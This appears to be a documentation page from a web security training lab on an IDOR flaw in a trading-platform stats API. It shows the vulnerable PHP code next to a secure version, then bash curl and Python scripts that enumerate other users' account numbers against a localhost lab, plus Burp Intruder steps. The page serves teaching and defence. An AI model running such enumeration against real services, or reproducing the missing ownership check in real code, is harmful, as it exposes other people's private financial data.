<?php
/**
 * Lab 27: Documentation - Part 2 (Technical Analysis)
 * IDOR in Stats API Endpoint
 */

require_once 'config.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Technical Analysis - Lab 27: Stats API IDOR</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            min-height: 100vh;
            color: #e0e0e0;
        }
        .header {
            background: rgba(0, 0, 0, 0.5);
            padding: 1rem 2rem;
            border-bottom: 1px solid rgba(255, 215, 0, 0.2);
            position: sticky;
            top: 0;
            z-index: 100;
            backdrop-filter: blur(10px);
        }
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 0.5rem;
            font-size: 1.5rem;
            font-weight: bold;
            color: #ffd700;
            text-decoration: none;
        }
        .logo-icon {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #ffd700, #ffaa00);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.5rem;
        }
        .nav-links a {
            color: #888;
            text-decoration: none;
            margin-left: 1.5rem;
        }
        .nav-links a:hover { color: #ffd700; }
        .main-content {
            max-width: 900px;
            margin: 0 auto;
            padding: 2rem;
        }
        .back-link {
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            color: #888;
            text-decoration: none;
            margin-bottom: 1.5rem;
        }
        .back-link:hover { color: #ffd700; }
        .page-header {
            margin-bottom: 2rem;
        }
        .page-header h1 {
            font-size: 2rem;
            color: #fff;
            margin-bottom: 0.5rem;
        }
        .page-header p { color: #888; }
        .doc-nav {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
            margin-bottom: 2rem;
            padding: 1rem;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
        }
        .doc-nav a {
            padding: 0.5rem 1rem;
            background: rgba(255, 215, 0, 0.1);
            border: 1px solid rgba(255, 215, 0, 0.3);
            border-radius: 6px;
            color: #ffd700;
            text-decoration: none;
            font-size: 0.85rem;
            transition: all 0.3s;
        }
        .doc-nav a:hover, .doc-nav a.active {
            background: rgba(255, 215, 0, 0.2);
        }
        .section {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 215, 0, 0.15);
            border-radius: 12px;
            padding: 2rem;
            margin-bottom: 2rem;
        }
        .section h2 {
            color: #ffd700;
            margin-bottom: 1rem;
            padding-bottom: 0.75rem;
            border-bottom: 1px solid rgba(255, 215, 0, 0.2);
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .section h3 {
            color: #fff;
            margin: 1.5rem 0 0.75rem;
        }
        .section h4 {
            color: #ddd;
            margin: 1.25rem 0 0.5rem;
        }
        .section p {
            color: #ccc;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .section ul, .section ol {
            color: #ccc;
            padding-left: 1.5rem;
            line-height: 1.8;
            margin-bottom: 1rem;
        }
        .code-block {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            overflow-x: auto;
        }
        .code-block pre {
            color: #e6edf3;
            font-family: 'Consolas', monospace;
            font-size: 0.85rem;
            line-height: 1.6;
            margin: 0;
        }
        .code-block .comment { color: #8b949e; }
        .code-block .keyword { color: #ff7b72; }
        .code-block .string { color: #a5d6ff; }
        .code-block .function { color: #d2a8ff; }
        .code-block .variable { color: #ffa657; }
        .code-block .url { color: #7ee787; }
        .code-block .vulnerable { 
            background: rgba(255, 68, 68, 0.2);
            display: inline;
            padding: 0.1rem 0.3rem;
            border-radius: 3px;
        }
        .highlight-box {
            background: rgba(255, 215, 0, 0.1);
            border-left: 4px solid #ffd700;
            padding: 1rem 1.25rem;
            margin: 1rem 0;
            border-radius: 0 8px 8px 0;
        }
        .danger-box {
            background: rgba(255, 68, 68, 0.1);
            border-left: 4px solid #ff6b6b;
            padding: 1rem 1.25rem;
            margin: 1rem 0;
            border-radius: 0 8px 8px 0;
        }
        .danger-box .label {
            color: #ff6b6b;
            font-weight: bold;
            margin-bottom: 0.5rem;
        }
        code {
            background: rgba(0, 0, 0, 0.4);
            padding: 0.2rem 0.4rem;
            border-radius: 4px;
            color: #00ff88;
            font-family: 'Consolas', monospace;
            font-size: 0.9em;
        }
        .file-path {
            color: #58a6ff;
            font-family: 'Consolas', monospace;
            font-size: 0.85em;
        }
        .flow-diagram {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            text-align: center;
        }
        .flow-diagram .step {
            display: inline-block;
            padding: 0.5rem 1rem;
            background: rgba(255, 215, 0, 0.1);
            border: 1px solid rgba(255, 215, 0, 0.3);
            border-radius: 6px;
            margin: 0.25rem;
            font-size: 0.85rem;
        }
        .flow-diagram .arrow {
            color: #ffd700;
            margin: 0 0.5rem;
        }
        .flow-diagram .bad-step {
            background: rgba(255, 68, 68, 0.2);
            border-color: #ff6b6b;
        }
        .comparison-table {
            width: 100%;
            border-collapse: collapse;
            margin: 1rem 0;
        }
        .comparison-table th, .comparison-table td {
            padding: 0.75rem;
            text-align: left;
            border: 1px solid rgba(255, 215, 0, 0.2);
        }
        .comparison-table th {
            background: rgba(255, 215, 0, 0.1);
            color: #ffd700;
        }
        .comparison-table td { color: #ccc; }
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 2rem;
            padding-top: 1.5rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        .btn {
            padding: 0.75rem 1.5rem;
            border-radius: 8px;
            text-decoration: none;
            font-weight: 600;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }
        .btn-primary {
            background: linear-gradient(135deg, #ffd700, #ffaa00);
            color: #000;
        }
        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            color: #e0e0e0;
        }
    </style>
</head>
<body>
    <header class="header">
        <div class="header-content">
            <a href="index.php" class="logo">
                <span class="logo-icon">📈</span>
                Exness PA
            </a>
            <nav class="nav-links">
                <a href="../index.php">← All Labs</a>
                <a href="dashboard.php">Dashboard</a>
                <a href="docs.php" style="color: #ffd700;">Docs</a>
                <?php if (isLoggedIn()): ?>
                <a href="logout.php" style="color: #ff6b6b;">Logout</a>
                <?php else: ?>
                <a href="login.php">Login</a>
                <?php endif; ?>
            </nav>
        </div>
    </header>

    <main class="main-content">
        <a href="docs.php" class="back-link">← Back to Overview</a>
        
        <div class="page-header">
            <h1>🔧 Technical Analysis</h1>
            <p>Deep dive into the vulnerable code and attack vectors</p>
        </div>

        <nav class="doc-nav">
            <a href="docs.php">Overview & Walkthrough</a>
            <a href="docs-technical.php" class="active">Technical Analysis</a>
            <a href="docs-mitigation.php">Mitigation Guide</a>
        </nav>

        <section class="section">
            <h2>🏗️ 1. Application Architecture</h2>
            
            <h3>API Endpoints Structure</h3>
            <p>The Stats API consists of four endpoints, each returning different trading metrics:</p>
            <div class="code-block">
                <pre><span class="file-path">/api/stats/</span>
├── <span class="url">equity.php</span>          <span class="comment">// Account equity over time</span>
├── <span class="url">net_profit.php</span>     <span class="comment">// Net profit/loss data</span>
├── <span class="url">orders_number.php</span>  <span class="comment">// Trade count statistics</span>
└── <span class="url">trading_volume.php</span> <span class="comment">// Volume in lots traded</span></pre>
            </div>

            <h3>Request Flow</h3>
            <div class="flow-diagram">
                <span class="step">Browser/Client</span>
                <span class="arrow">→</span>
                <span class="step">API Endpoint</span>
                <span class="arrow">→</span>
                <span class="step bad-step">No Auth Check!</span>
                <span class="arrow">→</span>
                <span class="step">Database Query</span>
                <span class="arrow">→</span>
                <span class="step">JSON Response</span>
            </div>

            <h3>Database Schema</h3>
            <p>Key tables involved in the vulnerability:</p>
            <div class="code-block">
                <pre><span class="keyword">TABLE</span> mt_accounts
├── id (INT)
├── user_id (INT)            <span class="comment">// Owner reference</span>
├── account_number (VARCHAR) <span class="comment">// MT5-XXXXXX format</span>
├── account_type (ENUM)
├── balance (DECIMAL)
└── leverage (VARCHAR)

<span class="keyword">TABLE</span> trading_stats
├── id (INT)
├── account_id (INT)         <span class="comment">// Links to mt_accounts</span>
├── stat_date (DATE)
├── equity (DECIMAL)
├── net_profit (DECIMAL)
├── orders_number (INT)
└── trading_volume (DECIMAL)</pre>
            </div>
        </section>

        <section class="section">
            <h2>💀 2. The Vulnerable Code</h2>
            
            <h3>API Endpoint: equity.php</h3>
            <p class="file-path">Location: /api/stats/equity.php</p>
            <div class="code-block">
                <pre><span class="keyword">&lt;?php</span>
<span class="keyword">require_once</span> <span class="string">'../../config.php'</span>;
<span class="function">header</span>(<span class="string">'Content-Type: application/json'</span>);

<span class="comment">// Check if user is logged in</span>
<span class="keyword">if</span> (!<span class="function">isLoggedIn</span>()) {
    <span class="function">http_response_code</span>(<span class="variable">401</span>);
    <span class="keyword">echo</span> <span class="function">json_encode</span>([<span class="string">'error'</span> => <span class="string">'Unauthorized'</span>]);
    <span class="keyword">exit</span>;
}

<span class="variable">$accountNumber</span> = <span class="variable">$_GET</span>[<span class="string">'accounts'</span>] ?? <span class="string">''</span>;
<span class="variable">$timeRange</span> = <span class="variable">$_GET</span>[<span class="string">'time_range'</span>] ?? <span class="string">'365'</span>;

<span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$accountNumber</span>)) {
    <span class="function">http_response_code</span>(<span class="variable">400</span>);
    <span class="keyword">echo</span> <span class="function">json_encode</span>([<span class="string">'error'</span> => <span class="string">'Account number required'</span>]);
    <span class="keyword">exit</span>;
}

<span class="comment">// 🚨 VULNERABLE: No ownership check!</span>
<span class="vulnerable"><span class="variable">$stats</span> = <span class="function">getAccountStats</span>(<span class="variable">$pdo</span>, <span class="variable">$accountNumber</span>, <span class="variable">$timeRange</span>, <span class="string">'equity'</span>);</span>

<span class="keyword">echo</span> <span class="function">json_encode</span>(<span class="variable">$stats</span>);</pre>
            </div>

            <div class="danger-box">
                <div class="label">⚠️ Security Issue</div>
                <p>
                    The endpoint checks <code>isLoggedIn()</code> (authentication) but NEVER verifies 
                    if <code>$_SESSION['user_id']</code> owns the requested account (authorization).
                </p>
            </div>

            <h3>Helper Function: getAccountStats()</h3>
            <p class="file-path">Location: /config.php</p>
            <div class="code-block">
                <pre><span class="keyword">function</span> <span class="function">getAccountStats</span>(<span class="variable">$pdo</span>, <span class="variable">$accountNumber</span>, <span class="variable">$timeRange</span>, <span class="variable">$statType</span>) {
    <span class="comment">// Get account ID from account number</span>
    <span class="variable">$account</span> = <span class="function">getAccountByNumber</span>(<span class="variable">$pdo</span>, <span class="variable">$accountNumber</span>);
    
    <span class="keyword">if</span> (!<span class="variable">$account</span>) {
        <span class="keyword">return</span> [<span class="string">'error'</span> => <span class="string">'Account not found'</span>];
    }
    
    <span class="comment">// 🚨 VULNERABLE: Missing check:</span>
    <span class="comment">// if ($account['user_id'] !== $_SESSION['user_id']) {</span>
    <span class="comment">//     return ['error' => 'Access denied'];</span>
    <span class="comment">// }</span>
    
    <span class="comment">// Directly fetch stats without authorization</span>
    <span class="variable">$sql</span> = <span class="string">"SELECT stat_date, $statType 
            FROM trading_stats 
            WHERE account_id = :account_id 
            AND stat_date >= DATE_SUB(CURDATE(), INTERVAL :days DAY)
            ORDER BY stat_date ASC"</span>;
    
    <span class="comment">// ... execute query and return data</span>
}</pre>
            </div>

            <h3>Another Vulnerable Function: getAccountByNumber()</h3>
            <div class="code-block">
                <pre><span class="keyword">function</span> <span class="function">getAccountByNumber</span>(<span class="variable">$pdo</span>, <span class="variable">$accountNumber</span>) {
    <span class="comment">// 🚨 Returns ANY account without ownership verification</span>
    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(<span class="string">"SELECT * FROM mt_accounts WHERE account_number = ?"</span>);
    <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$accountNumber</span>]);
    <span class="keyword">return</span> <span class="variable">$stmt</span>-><span class="function">fetch</span>();
}

<span class="comment">// vs. SECURE version:</span>
<span class="keyword">function</span> <span class="function">getAccountByNumberSecure</span>(<span class="variable">$pdo</span>, <span class="variable">$accountNumber</span>, <span class="variable">$userId</span>) {
    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-><span class="function">prepare</span>(
        <span class="string">"SELECT * FROM mt_accounts WHERE account_number = ? AND user_id = ?"</span>
    );
    <span class="variable">$stmt</span>-><span class="function">execute</span>([<span class="variable">$accountNumber</span>, <span class="variable">$userId</span>]);
    <span class="keyword">return</span> <span class="variable">$stmt</span>-><span class="function">fetch</span>();
}</pre>
            </div>
        </section>

        <section class="section">
            <h2>🎯 3. Attack Vectors</h2>
            
            <h3>Vector 1: URL Parameter Manipulation</h3>
            <p>The simplest attack - directly modify the URL in the browser:</p>
            <div class="code-block">
                <pre><span class="comment"># Original request (your account)</span>
<span class="url">GET /api/stats/equity.php?time_range=365&accounts=MT5-100001</span>

<span class="comment"># Modified request (victim's account)</span>
<span class="url">GET /api/stats/equity.php?time_range=365&accounts=MT5-200001</span></pre>
            </div>

            <h3>Vector 2: Developer Tools</h3>
            <p>Intercept and modify requests using browser DevTools:</p>
            <ol>
                <li>Open DevTools (F12) → Network tab</li>
                <li>Trigger a legitimate stats request</li>
                <li>Right-click the request → "Edit and Resend"</li>
                <li>Change the <code>accounts</code> parameter</li>
                <li>Send and observe the response</li>
            </ol>

            <h3>Vector 3: Automated Enumeration</h3>
            <p>Script to enumerate all accounts:</p>
            <div class="code-block">
                <pre><span class="comment"># Bash script with curl</span>
<span class="keyword">for</span> i <span class="keyword">in</span> {100001..100100}; <span class="keyword">do</span>
    <span class="function">curl</span> -s -b <span class="string">"PHPSESSID=xxx"</span> \
        <span class="string">"http://localhost/AC/Lab-27/api/stats/equity.php?accounts=MT5-$i"</span> | \
        <span class="function">jq</span> <span class="string">'.'</span>
    <span class="function">sleep</span> 0.5
<span class="keyword">done</span>

<span class="comment"># Python script</span>
<span class="keyword">import</span> requests

session = requests.Session()
<span class="comment"># Login first to get session cookie</span>
session.post(<span class="string">'http://localhost/AC/Lab-27/login.php'</span>, data={
    <span class="string">'username'</span>: <span class="string">'attacker'</span>,
    <span class="string">'password'</span>: <span class="string">'attacker123'</span>
})

<span class="keyword">for</span> i <span class="keyword">in</span> range(100001, 400001, 100000):
    resp = session.get(
        <span class="string">f'http://localhost/AC/Lab-27/api/stats/equity.php?accounts=MT5-{i}'</span>
    )
    <span class="function">print</span>(<span class="string">f'MT5-{i}:'</span>, resp.json())</pre>
            </div>

            <h3>Vector 4: Burp Suite Intruder</h3>
            <p>Professional testing with automated enumeration:</p>
            <ol>
                <li>Capture a request to the stats API in Burp</li>
                <li>Send to Intruder</li>
                <li>Set the <code>accounts</code> parameter as injection point</li>
                <li>Use a number list payload (100001-400001)</li>
                <li>Filter responses by length to find valid accounts</li>
            </ol>
        </section>

        <section class="section">
            <h2>📊 4. Data Exposure Analysis</h2>
            
            <h3>Information Leaked Per Account</h3>
            <table class="comparison-table">
                <tr>
                    <th>Endpoint</th>
                    <th>Data Exposed</th>
                    <th>Risk Level</th>
                </tr>
                <tr>
                    <td><code>equity.php</code></td>
                    <td>365 days of equity values (~$100K-$10M)</td>
                    <td>🔴 Critical</td>
                </tr>
                <tr>
                    <td><code>net_profit.php</code></td>
                    <td>Daily profit/loss figures</td>
                    <td>🔴 Critical</td>
                </tr>
                <tr>
                    <td><code>trading_volume.php</code></td>
                    <td>Volume traded per day (lots)</td>
                    <td>🟡 High</td>
                </tr>
                <tr>
                    <td><code>orders_number.php</code></td>
                    <td>Number of trades executed</td>
                    <td>🟡 High</td>
                </tr>
            </table>

            <h3>Business Impact</h3>
            <ul>
                <li><strong>Competitive Intelligence:</strong> Competitors can analyze trading strategies</li>
                <li><strong>Social Engineering:</strong> Attackers know exactly how much a trader has</li>
                <li><strong>Market Manipulation:</strong> Large positions could be front-run</li>
                <li><strong>Reputation Damage:</strong> Privacy breach affecting trust in platform</li>
                <li><strong>Regulatory Issues:</strong> Potential GDPR/financial data violations</li>
            </ul>
        </section>

        <section class="section">
            <h2>🔎 5. Root Cause Analysis</h2>
            
            <h3>Security Anti-Patterns Present</h3>
            <ol>
                <li>
                    <strong>Client-Side Trust:</strong> Assuming the <code>accounts</code> parameter 
                    from the client is trustworthy
                </li>
                <li>
                    <strong>Missing Authorization Layer:</strong> No middleware or function checking 
                    resource ownership
                </li>
                <li>
                    <strong>Direct Object Reference:</strong> Using user-supplied identifiers to 
                    directly access database records
                </li>
                <li>
                    <strong>Insufficient Access Control:</strong> Only checking authentication, 
                    not authorization
                </li>
                <li>
                    <strong>Predictable Resource IDs:</strong> Sequential account numbers make 
                    enumeration trivial
                </li>
            </ol>

            <div class="highlight-box">
                <p>
                    <strong>Key Insight:</strong> The vulnerability would persist even with random 
                    UUIDs instead of sequential numbers. The core issue is the missing ownership 
                    check, not the predictable identifiers. UUIDs only provide "security through 
                    obscurity" - true security requires proper authorization.
                </p>
            </div>
        </section>

        <div class="nav-buttons">
            <a href="docs.php" class="btn btn-secondary">← Overview</a>
            <a href="docs-mitigation.php" class="btn btn-primary">Mitigation Guide →</a>
        </div>
    </main>
</body>
</html>
